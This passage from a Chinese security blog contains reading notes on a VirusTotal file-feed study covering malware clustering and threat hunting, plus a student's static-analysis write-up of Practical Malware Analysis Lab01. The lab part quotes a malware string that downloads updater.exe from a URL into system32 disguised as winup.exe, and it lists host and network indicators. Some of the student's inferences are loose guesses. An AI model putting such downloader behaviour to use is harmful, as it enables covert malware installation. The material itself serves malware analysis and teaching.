<p>这个问题探讨VT文件源是否包含足够多的不同文件类型（如可执行文件、脚本、文档等），以便研究人员可以构建专门针对特定文件类型的恶意软件数据集。这对于开发针对特定类型文件的专门安全工具和策略尤为重要。</p>
</li>
<li><p>它提供的样本有多新鲜？</p>
<p>这里询问的是VT文件源中样本的新鲜度，即样本从被捕获到上传到VT并可供研究的时间间隔有多短。新鲜度高的样本可以让研究人员和安全专家及时了解并对抗最新的恶意软件威胁。</p>
</li>
<li><p>它所见的恶意软件家族的分布是怎样的？</p>
<p>这个问题关注的是VT文件源中恶意软件家族的分布情况。家族分布可以反映出哪些类型的恶意软件最常见，哪些正在增加，这有助于安全研究人员和行业了解当前恶意软件的趋势和动态。</p>
</li>
<li><p>这种分布真的能代表用户设备上的恶意软件吗？</p>
<p>这个问题询问VT文件源中的恶意软件家族分布是否能准确反映普通用户设备上遭遇的恶意软件的实际情况。这是评估VT数据源在现实世界安全应用中有效性的重要方面，因为如果数据源的分布与实际情况相差甚远，那么基于这些数据的研究和解决方案可能无法有效应对真实的威胁。</p>
</li>
</ul>
<p>探索了如何通过研究可扩展的方法，在2.35亿样本的数据源上产生高纯度的聚类来进行大规模的威胁猎捕。</p>
<p>三种聚类方法：</p>
<ul>
<li>层次聚合聚类（HAC）</li>
<li>适用于TLSH摘要的更可扩展的HAC变体（HAC-T）</li>
<li>简单的特征值分组（FVG）</li>
</ul>
<p>最后，使用生成的聚类进行威胁猎捕，具体是用来检测那些被认为是良性的19万样本（即，检测结果为零的样本），这些样本可能实际上是恶意的，因为它们属于2.9万个聚类，其中大多数样本被检测为恶意。</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><ul>
<li>如何在不采用极端激进的过滤策略的情况下，将威胁猎捕扩展到文件源的内容上。</li>
</ul>
<h3 id="贡献："><a href="#贡献：" class="headerlink" title="贡献："></a>贡献：</h3><p>以下是对上文中提到的三个主要贡献的总结：</p>
<ol>
<li><p><strong>VT文件源的特性分析</strong>：</p>
<ul>
<li>我们利用一年内收集的2.35亿样本的3.28亿份分析报告，以及同期安全供应商的遥测数据，对VT文件源进行了详细的特性分析。</li>
<li>我们发现，尽管VT文件源的数据量是遥测数据的1&#x2F;17，但观测到的恶意软件数量却是遥测数据的8倍，显示出VT文件源在捕捉恶意软件方面的高效性。</li>
<li>文件源非常新鲜，每天接收超过一百万个新样本，这些样本在用户设备上出现后平均4.4小时就会出现在文件源中。</li>
<li>在新样本中，62%可以立即被标记为已知家族的变体，但有38%未被标记。0.3%的新样本最初完全未被检测到，但随后多个杀毒引擎开始标记它们。</li>
<li>文件源包含丰富的文件类型和至少有100个样本的4.9千个家族，但这种多样性主要由Windows和Android家族驱动。家族分布与遥测数据的观察结果显著不同，表明VT文件源可能不适合推断家族对真实用户的影响。</li>
</ul>
</li>
<li><p><strong>可扩展的聚类方法探索</strong>：</p>
<ul>
<li>我们评估了三种能够处理VT文件源中数亿样本的聚类方法：层次聚合聚类（HAC）、针对TLSH摘要的更高效的HAC版本（HAC-T）以及简单的按特征值分组（FVG）。</li>
<li>首先，我们使用Windows和Android的真实数据集来评估这些方法的准确性。</li>
<li>接着，我们评估了这些方法的可扩展性，发现只有FVG能够适应文件源的庞大数据量。</li>
</ul>
</li>
<li><p><strong>应用FVG聚类来检测完全未被发现的恶意软件</strong>：</p>
<ul>
<li>使用FVG，我们对2.35亿个样本进行聚类，不考虑它们是否已被杀毒引擎检测到。</li>
<li>我们识别出了29,000个FVG-vhash聚类，这些聚类中的多数样本被多个杀毒引擎检测到，包含了190,000个可能是恶意的、但未被检测到的样本。这表明FVG聚类方法在识别潜在恶意软件方面具有有效性。</li>
</ul>
</li>
</ol>
<h2 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h2><h2 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h2><ul>
<li>样本特征</li>
<li>扫描特征</li>
<li>派生特征</li>
</ul>
<p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2014.46.12.png" alt="截屏2024-05-29 14.46.12"></p>
<p>加密哈希 crypto-graphic hashes</p>
<ul>
<li>应用于整个文件的: sha256、sha1、md5</li>
<li>计算文件部分的：imphash、richpe_hash、cert_thumbprint、authentihash、icon_hash</li>
</ul>
<p>模糊哈希 fuzzy hashes</p>
<ul>
<li>tlsh 研究表明tlsh比ssdeep好；tlsh使用哈希值上的汉明距离来确定两个输入是否相似</li>
<li>ssdeep</li>
</ul>
<p>结构哈希</p>
<ul>
<li><strong>vhash:</strong> <ul>
<li>它考虑了样本属性，如导入、导出、段和文件大小。</li>
<li>vhash似乎是不同文件类型的一组结构哈希的通用名称。</li>
<li>VT为许多文件类型计算vhash（例如，PE可执行文件、APKs、PDFs、Office文档），但并非全部（例如，JPEG和PNG图像没有vhash）。</li>
<li>VT使用vhash为文件提供每日聚类。我们已经确认同一聚类中的样本具有相同的vhash值，因此我们使用等值比较两个vhash值。尽管是专有的且大部分未被文档记录，我们在第5节的实验评估显示vhash是一个用于聚类的良好特征。</li>
</ul>
</li>
</ul>
<p>时间戳（time stamp）</p>
<ul>
<li>scan_date</li>
<li>fseen_date</li>
<li>cert_valid_from</li>
<li>cert_valid_to</li>
</ul>
<p>杀毒扫描 AV scan</p>
<ul>
<li>我们提取检测到样本的引擎数量（即给出非空标签的引擎数量）（vt_score）</li>
</ul>
<p>程序 package_name</p>
<ul>
<li><code>package_name</code> 是Android应用的包标识符</li>
<li><code>vt_meaningful_name</code> 是VT为样本选择的最有意义的文件名（例如，在提交给VT时样本的所有文件名中选择）。</li>
</ul>
<p>派生特征 Derived Features</p>
<p>文件类型：</p>
<p>通过 trid_file_type、vt_tags、vt_meaningful_name</p>
<ul>
<li>trid_file_type 是使用TrID工具识别的文件类型</li>
<li>vt_tag：<img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2016.21.28.png" alt="截屏2024-05-29 16.21.28"></li>
<li>当vt_meaningful_name可用时，我们从文件名中提取扩展名，并将该扩展名映射到一个文件类型。</li>
</ul>
<p>AVClass 特征：</p>
<p>AVCLASS2 是一个病毒标记工具，</p>
<h2 id="文件源分析-Feed-Analysis"><a href="#文件源分析-Feed-Analysis" class="headerlink" title="文件源分析 Feed Analysis"></a>文件源分析 Feed Analysis</h2><p>回答了以下问题：</p>
<ul>
<li><p>(1) VT文件源与AV遥测数据相比有多大？</p>
<p>VT文件源包含的恶意软件数量是遥测数据的八倍，使其成为获取恶意样本的重要来源。</p>
</li>
<li><p>(2) 文件源中的样本有多新鲜？</p>
<p>在收集到的样本中，有89%是新样本，即之前VT未知的样本，而且文件源每天提供超过一百万个新样本。</p>
</li>
<li><p>(3) 文件源在文件类型方面有多样化吗？</p>
<p>文件源中三分之二的样本是Windows PE文件，但该源对于多种文件类型来说都是一个很好的样本来源。文件源缺乏统一的文件类型字段，对于大量样本来说，文件类型的识别是具有挑战性的。</p>
<p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2017.17.45.png" alt="截屏2024-05-29 17.17.45"></p>
</li>
<li><p>(4) 有多少比例的样本在首次扫描时可以被检测为恶意的？</p>
<p>VT文件源是一个文件源而不是恶意软件源。其一半的数据量是未被检测到的样本，而53%的样本在首次观察时没有被检测到。另一方面，由于这些样本与之前看到的恶意软件具有相似特征（即匹配现有的签名），有41%至47%的样本在首次被杀毒引擎检测时可以被识别为恶意软件。</p>
</li>
<li><p>(5) 文件源在家族方面有多样化吗？</p>
<p>该数据源具有多样性，拥有至少100个样本的家族达4.9千个。然而，这种多样性主要是由于peexe和apk家族。对于这两种文件类型，该数据源是构建大规模家族分类数据集的良好来源。AVCLASS2在首次观察时就能为62%的样本进行标记。因此，它可以用作过滤器，移除那些已被良好检测的家族的样本，使分析师可以专注于38%未标记的样本。</p>
</li>
<li><p>(6) 有多少比例的恶意样本在首次扫描时完全未被检测到？</p>
<p>至少有0.3%提交给VT的样本最初是完全未被检测到的（FUD），即它们在首次VT观察时没有被检测到，但后来至少有4个引擎认为它们是恶意的。与其他文件类型相比，PDF文档更有可能是FUD。</p>
</li>
<li><p>(7) 有多少比例的样本是签名的？</p>
<p>VT支持提取多种文件类型的代码签名，但整个文件源的样本中只有一小部分（5.6%）以及peexe样本中的3.7%拥有代码签名。</p>
</li>
<li><p>(8) 文件源和AV遥测数据在恶意样本上的重叠情况如何？哪一个更快地看到样本？</p>
<p>遥测数据和VT文件源观察到的恶意样本集大部分是不相交的（共有的样本只占文件源的1.2%到1.8%）。因此，即使是最大的安全供应商也只能看到恶意样本全域的一小部分。VT文件源中的家族分布与遥测观察到的显著不同，这表明VT可能不是一个好的资源来推断家族对真实用户的影响。两个数据集中的新样本在设备上平均提前4.4小时被看到，因此文件源中的新恶意样本相当新近。此外，有39%的新样本在VT中被观察到之前还未在用户设备中出现，所以VT可能为安全供应商提供有用的早期警报。</p>
</li>
</ul>
<h2 id="聚类-Clustering"><a href="#聚类-Clustering" class="headerlink" title="聚类 Clustering"></a>聚类 Clustering</h2><p><strong>聚类特征 Clustering features</strong></p>
<p>检查9个可以识别相似样本的特征。</p>
<p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2018.02.59.png" alt="截屏2024-05-29 18.02.59"></p>
<p><strong>聚类方法  Clustering approaches</strong></p>
<ul>
<li>特征值分组（FVG）：通过在单一特征的值上使用等值关系对样本进行分组，例如，所有具有相同vhash值的样本形成一个聚类。使用FVG进行聚类时，特征向量按照（特征值，样本哈希，扫描日期）的三元组排序。特征值的变化表明一个新的聚类。FVG是一种极具可扩展性的方法。我们使用不同的特征评估FVG，以了解哪些特征提供高精度，并且这些特征能达到什么召回率。</li>
<li>单一链接的层次聚合聚类（HAC）：</li>
<li>基于阈值的层次聚合聚类（HAC-T）：这是一种使用TLSH哈希值聚类样本的可扩展方法。</li>
</ul>
<p><strong>精确度评估</strong></p>
<p><strong>可扩展性</strong></p>
<p>FVG-vhash：1.4h 分类效率最高</p>
<p>HAC-T：22.4h</p>
<p><strong>聚类整个数据集</strong> Clustering the whole dataset.</p>
<p>使用FVG-vhash，特征为：</p>
<ul>
<li>Avc2_family:</li>
<li>vhash</li>
<li>Cert_thumbprint</li>
<li>imphash</li>
</ul>
<h2 id="检测不太良性的样本-Detecting-Not-so-Benign-Samples"><a href="#检测不太良性的样本-Detecting-Not-so-Benign-Samples" class="headerlink" title="检测不太良性的样本 Detecting Not-so-Benign Samples"></a>检测不太良性的样本 Detecting Not-so-Benign Samples</h2><p>在图表中描述的聚类分类基于两个比率，即r1和r4，这两个比率定义如下：</p>
<ul>
<li><strong>r1</strong>: 聚类中至少被检测到一次的样本占聚类中所有样本的百分比。</li>
<li><strong>r4</strong>: 聚类中至少被检测到四次的样本占聚类中所有样本的百分比。</li>
</ul>
<p>这两个比率用来判断聚类中样本的检测频率，从而将聚类分为以下几种类型：</p>
<ol>
<li><strong>完全恶意聚类（Fully malicious clusters）</strong>:<ul>
<li>这种类型的聚类中，所有样本（100%）都至少被检测到一次或四次，即r1或r4等于1。这表示聚类中的每一个样本都被视为恶意。</li>
</ul>
</li>
<li><strong>完全良性聚类（Fully benign clusters）</strong>:<ul>
<li>在这种聚类中，没有样本被检测到，即r1和r4都为0。这表示聚类中的所有样本都未被任何检测工具标记为恶意。</li>
</ul>
</li>
<li><strong>混合聚类（Mixed clusters）</strong>:<ul>
<li>混合聚类包含既被检测到也未被检测到的样本，即0 &lt; r1 &lt; 1 和 0 &lt; r4 &lt; 1。这意味着聚类中的一部分样本被检测为恶意，而另一部分没有被检测到。</li>
</ul>
</li>
<li><strong>恶意多数聚类（Malicious majority clusters）</strong>:<ul>
<li>这类聚类中，大部分但不是全部的样本至少被检测到一次或四次，但未达到完全恶意的标准。通常，这意味着超过半数的样本显示出恶意特征，但仍有少数样本未被检测到。</li>
</ul>
</li>
</ol>
<p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-30%2013.58.19.png" alt="截屏2024-05-30 13.58.19"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/25/PracticalMalwareAnalysis-Lab01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/25/PracticalMalwareAnalysis-Lab01/" class="post-title-link" itemprop="url">PracticalMalwareAnalysis-Lab01</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-25 13:42:59" itemprop="dateCreated datePublished" datetime="2024-04-25T13:42:59+08:00">2024-04-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-07 18:26:06" itemprop="dateModified" datetime="2024-05-07T18:26:06+08:00">2024-05-07</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab01-静态分析基础技术"><a href="#Lab01-静态分析基础技术" class="headerlink" title="Lab01 静态分析基础技术"></a>Lab01 静态分析基础技术</h1><h2 id="lab1-1"><a href="#lab1-1" class="headerlink" title="lab1-1"></a>lab1-1</h2><h3 id="1-将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？"><a href="#1-将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？" class="headerlink" title="1. 将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？"></a>1. 将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？</h3><p>如图所示，文件匹配到了反病毒软件的特征，并分别被38、51种反病毒软件识别。<img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.28.39.png" alt="截屏2024-04-25 15.28.39"></p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.26.06.png" alt="截屏2024-04-25 15.26.06"></p>
<h3 id="2-这些文件是什么时候编译的？"><a href="#2-这些文件是什么时候编译的？" class="headerlink" title="2. 这些文件是什么时候编译的？"></a>2. 这些文件是什么时候编译的？</h3><p>这是文件创建的时间。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.51.16.png" alt="截屏2024-04-25 15.51.16"></p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.52.01.png" alt="截屏2024-04-25 15.52.01"></p>
<h3 id="3-这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？"><a href="#3-这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？" class="headerlink" title="3. 这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？"></a>3. 这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？</h3><p>通过PEiD 软件的输出得到它们没有被加壳或混淆。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.08.22.png" alt="截屏2024-04-25 16.08.22"></p>
<p>这里举一个已被混淆的输出，这是一个被 UPX版本在0.89.6到2.90之间的某个版本压缩过。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.09.22.png" alt="截屏2024-04-25 16.09.22"></p>
<h3 id="4-是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？"><a href="#4-是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？" class="headerlink" title="4. 是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？"></a>4. 是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？</h3><p>这是通过Dependency Walker 分析<code>lab01-01.exe</code>的结果，通过导入函数 CopyFileA, FindNextFileA, FindFirstFileA 可知，该代码是<strong>寻找并复制文件</strong></p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.30.18.png" alt="截屏2024-04-25 16.30.18"></p>
<p>这是通过Dependency Walker 分析<code>lab01-01.dll</code>的结果，我只在导入表<code>KERNEL32.DLL</code>中找到有用的信息。通过导入函数CreateProcessA, CreateMutexA等函数，推测是创建进程和互斥锁，让进程休眠的作用。</p>
<p><strong>WS2_32.DLL在书的第14 页有提到</strong>，是用来联网的DLL</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.34.47.png" alt="截屏2024-04-25 16.34.47"></p>
<h3 id="5-是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？"><a href="#5-是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？" class="headerlink" title="5. 是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？"></a>5. 是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？</h3><p>使用PEview打开lab01-01.exe结果如图所示，我们发现<code>kernel32.dll</code>和<code>kerne132.dll</code>。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.50.15.png" alt="截屏2024-04-25 16.50.15"></p>
<h3 id="6-是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码"><a href="#6-是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码" class="headerlink" title="6. 是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码"></a>6. 是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码</h3><p>使用PEview打开lab01-01.dll 结果如图所示，我们可以看到如图所示的ip地址 127.26.152.13，推断可以通过这个信息发现恶意代码。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2018.38.49.png" alt="截屏2024-04-25 18.38.49"></p>
<h3 id="7-你猜这些文件的目的是什么"><a href="#7-你猜这些文件的目的是什么" class="headerlink" title="7. 你猜这些文件的目的是什么"></a>7. 你猜这些文件的目的是什么</h3><blockquote>
<p>[!WARNING]</p>
<p>猜不出来。。。</p>
<p>答案上说：.dll文件可能是一个后门文件。而.exe文件是用来安装和运行DLL文件的</p>
</blockquote>
<h2 id="lab1-2"><a href="#lab1-2" class="headerlink" title="lab1-2"></a>lab1-2</h2><p>分析lab01-02.exe 文件</p>
<h3 id="1-将Lab01-02-exe-文件上传到virus-total查看报告。"><a href="#1-将Lab01-02-exe-文件上传到virus-total查看报告。" class="headerlink" title="1. 将Lab01-02.exe 文件上传到virus total查看报告。"></a>1. 将Lab01-02.exe 文件上传到virus total查看报告。</h3><p>文件匹配到了已有的反病毒软件特征</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.16.01.png" alt="截屏2024-05-07 15.16.01"></p>
<h3 id="2-这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。"><a href="#2-这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。" class="headerlink" title="2. 这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。"></a>2. 这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。</h3><p>该文件已被UPX加壳，如图所示。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.22.43.png" alt="截屏2024-05-07 15.22.43"></p>
<p>使用upx进行脱壳。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.27.38.png" alt="截屏2024-05-07 15.27.38"></p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.29.34.png" alt="截屏2024-05-07 15.29.34"></p>
<h3 id="3-有没有任何导入函数能够暗示出这个程序的功能？"><a href="#3-有没有任何导入函数能够暗示出这个程序的功能？" class="headerlink" title="3. 有没有任何导入函数能够暗示出这个程序的功能？"></a>3. 有没有任何导入函数能够暗示出这个程序的功能？</h3><p><del>从导入函数推测该程序可能会产生一个互斥锁。</del></p>
<p>错误的原因：几乎所有的程序都会新建一个线程或打开一个锁。因此我们要查看另外两个库</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.43.58.png" alt="截屏2024-05-07 15.43.58"></p>
<p>这两个库中有函数<code>CreateServiceA</code>、<code>InternetOpenUrlA</code>、<code>InternetOpenA</code>。这些函数是用来打开网络和新建服务器的。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2016.03.16.png" alt="截屏2024-05-07 16.03.16"></p>
<h3 id="4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"><a href="#4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"></a>4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器</h3><p>结合上文，网络的迹象可能是向 <a target="_blank" rel="noopener" href="http://www.malwareanalysisbook.com/">www.malwareanalysisbook.com</a> 发送一些信息。其中 internet Explorer.8.0 可能是利用该浏览器的漏洞， Malservice 可能是一个恶意服务。</p>
<p>应该通过一个名为Malservice的服务，并通过到 <a target="_blank" rel="noopener" href="http://www.malwareanalysisbook.com/">www.malwareanalysisbook.com</a> 的网络流量，检查被恶意代码感染的主机。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.47.12.png" alt="截屏2024-05-07 15.47.12"></p>
<h2 id="lab1-3"><a href="#lab1-3" class="headerlink" title="lab1-3"></a>lab1-3</h2><p>分析lab01-03.exe 文件</p>
<h3 id="1-将Lab01-03-exe-文件上传到virus-total查看报告。"><a href="#1-将Lab01-03-exe-文件上传到virus-total查看报告。" class="headerlink" title="1. 将Lab01-03.exe 文件上传到virus total查看报告。"></a>1. 将Lab01-03.exe 文件上传到virus total查看报告。</h3><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2016.11.53.png" alt="截屏2024-05-07 16.11.53"></p>
<h3 id="2-这个文件是否有混淆或加壳的迹象？"><a href="#2-这个文件是否有混淆或加壳的迹象？" class="headerlink" title="2. 这个文件是否有混淆或加壳的迹象？"></a>2. 这个文件是否有混淆或加壳的迹象？</h3><p>查看导入表，里面只有两个函数，可以推断该文件已被加壳。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.08.56.png" alt="截屏2024-05-07 17.08.56"></p>
<p>用PEiD无法知道是哪种壳，现阶段的学习无法将该软件脱壳。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.10.20.png" alt="截屏2024-05-07 17.10.20"></p>
<h3 id="3-有无导入函数能够暗示这个程序的功能？"><a href="#3-有无导入函数能够暗示这个程序的功能？" class="headerlink" title="3. 有无导入函数能够暗示这个程序的功能？"></a>3. 有无导入函数能够暗示这个程序的功能？</h3><p>无法脱壳，目前不能回答这个问题</p>
<h3 id="4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器-1"><a href="#4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器-1" class="headerlink" title="4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"></a>4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器</h3><p>无法脱壳，目前不能回答这个问题</p>
<h2 id="lab1-3-1"><a href="#lab1-3-1" class="headerlink" title="lab1-3"></a>lab1-3</h2><h3 id="1-将Lab01-04-exe-文件上传到virus-total查看报告。"><a href="#1-将Lab01-04-exe-文件上传到virus-total查看报告。" class="headerlink" title="1. 将Lab01-04.exe 文件上传到virus total查看报告。"></a>1. 将Lab01-04.exe 文件上传到virus total查看报告。</h3><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.25.23.png" alt="截屏2024-05-07 17.25.23"></p>
<h3 id="2-这个文件是否有混淆或加壳的迹象？-1"><a href="#2-这个文件是否有混淆或加壳的迹象？-1" class="headerlink" title="2. 这个文件是否有混淆或加壳的迹象？"></a>2. 这个文件是否有混淆或加壳的迹象？</h3><p>这个文件没有被加壳或混淆的迹象。</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.25.39.png" alt="截屏2024-05-07 17.25.39"></p>
<h3 id="3-这个文件是什么时候被编译的"><a href="#3-这个文件是什么时候被编译的" class="headerlink" title="3. 这个文件是什么时候被编译的"></a>3. 这个文件是什么时候被编译的</h3><h3 id="4-有无导入函数能够暗示这个程序的功能？"><a href="#4-有无导入函数能够暗示这个程序的功能？" class="headerlink" title="4. 有无导入函数能够暗示这个程序的功能？"></a>4. 有无导入函数能够暗示这个程序的功能？</h3><p>通过导入函数表和部分二进制数据的信息来看，</p>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2018.10.50.png" alt="截屏2024-05-07 18.10.50"></p>
<p>图中的十六进制数据中包含了一些可读的ASCII字符串,其中有两条值得注意:</p>
<ol>
<li>“winup.exe %s%s”: 暗示该文件可能与一个名为”winup.exe”的程序相关,并且可能会向其传递一些参数。</li>
<li>“system32\winup.exe %s%s <a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com/updater.exe">http://www.practicalmalwareanalysis.com/updater.exe</a>“: 这是一个URL,指向一个名为”updater.exe”的文件。结合前面的”winup.exe”和”system32”的信息,可以推测该程序可能会从该URL下载一个名为”updater.exe”的文件,并将其保存在系统的”system32”目录下,伪装成”winup.exe”。</li>
</ol>
<p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2018.21.58.png" alt="截屏2024-05-07 18.21.58"></p>
<h3 id="5-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"><a href="#5-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="5. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"></a>5. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器</h3><h3 id="6-这个文件在资源段中包含一个资源。使用Resource-Hacker-工具来检查资源，然后抽取资源。"><a href="#6-这个文件在资源段中包含一个资源。使用Resource-Hacker-工具来检查资源，然后抽取资源。" class="headerlink" title="6. 这个文件在资源段中包含一个资源。使用Resource Hacker 工具来检查资源，然后抽取资源。"></a>6. 这个文件在资源段中包含一个资源。使用Resource Hacker 工具来检查资源，然后抽取资源。</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/15/LIEF-TUTORIALS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/15/LIEF-TUTORIALS/" class="post-title-link" itemprop="url">LIEF TUTORIALS</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-04-15 09:36:52 / 修改时间：10:21:10" itemprop="dateCreated datePublished" datetime="2024-04-15T09:36:52+08:00">2024-04-15</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
